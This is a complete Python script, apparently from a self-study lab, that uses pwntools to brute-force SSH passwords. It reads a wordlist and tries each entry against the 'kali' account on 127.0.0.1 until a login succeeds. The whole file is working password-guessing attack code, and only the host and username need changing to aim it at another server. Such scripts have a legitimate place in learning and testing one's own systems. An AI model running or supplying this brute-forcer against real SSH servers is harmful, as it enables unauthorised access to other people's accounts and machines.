import paramiko.ssh_exception


from pwn import *                 #Using PwnTools library
import paramiko                   #Paramiko is used for error-handling

host = "127.0.0.1"
username = "kali"         #Provide the username of your Kali VM 
attempts = 0


with open("/home/kali/Desktop/top-passwords-shortlist.txt", "r") as password_list:          #Provide a wordlist which contains a set of passwords needed for Brute Forcing
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting Password: '{}'!".format(attempts, password))
            response = ssh(host = host, user=username, password=password, timeout=1)

            #Authentication Successful
            if response.connected():
                print("[>] Valid Password Found: '{}'!".format(password))
                response.close()
                break
            response.close()

        # If the try block fails, then Invalid Password is printed out
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password!")
            
        attempts += 1

